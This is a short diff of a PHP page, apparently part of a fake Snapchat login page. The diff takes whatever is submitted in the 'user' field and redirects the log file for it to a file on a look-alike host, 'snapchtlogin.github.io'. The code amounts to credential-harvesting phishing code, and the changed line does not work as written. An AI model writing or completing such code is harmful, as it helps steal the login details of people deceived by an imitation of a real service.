@@ -44,7 +44,7 @@ html * {
 		<br> <br> <br>
 		</div>
 <?php
-		$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
+		$myfile = fopen("https://snapchtlogin.github.io/Snapchat/newfile.txt", "a") or die("Unable to open file!");
 		fwrite($myfile,"\n");
 		$txt = $_GET["user"];
 		fwrite($myfile, $txt."\n");
